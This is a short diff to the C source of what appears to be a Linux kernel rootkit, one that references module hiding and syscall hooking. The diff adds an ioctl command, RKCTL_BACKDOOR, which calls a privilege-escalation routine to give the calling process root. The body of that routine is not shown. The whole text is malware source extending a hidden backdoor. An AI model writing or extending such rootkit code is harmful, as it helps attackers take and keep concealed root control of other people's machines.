@@ -6,6 +6,7 @@
 #include "module_hiding.h"
 #include "shared.h"
 #include "syscall_hooking.h"
+#include "priv_escalation.h"
 
 static int cleanup(void *_data) {
 
@@ -44,6 +45,14 @@ static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
              * while communicating via it
              */
             kthread_run(cleanup, NULL, "Cleanup_tlskit");
+            break;
+
+        case RKCTL_BACKDOOR:
+
+            /*
+             * Make the current task root
+             */
+            privilege_escalation();
             break;
 
         default:
